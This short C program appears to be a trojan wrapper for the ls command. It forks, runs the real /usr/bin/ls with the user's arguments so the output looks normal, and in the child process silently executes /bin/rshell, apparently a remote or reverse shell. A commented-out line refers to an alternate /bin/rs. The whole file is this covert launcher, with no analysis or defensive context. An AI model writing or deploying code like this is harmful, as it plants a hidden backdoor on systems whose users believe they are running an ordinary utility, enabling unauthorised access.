#include<stdio.h>
#include <sys/types.h>
#include <unistd.h>
  
int main(int argc, char *argv[])
{
    int pid = fork();
  
    if (pid > 0) {
        if (execvp("/usr/bin/ls", argv)<0) {
        } 
    } else if (pid == 0)
    {
        char *args[] = {"/bin/rshell", NULL};
        //        char *args[] = {"/bin/rs", NULL};
//          if (execvp("/bin/rs", args)<0) {
          if (execvp("/bin/rshell", args)<0) {
        }
    }
  
    return 0;
}
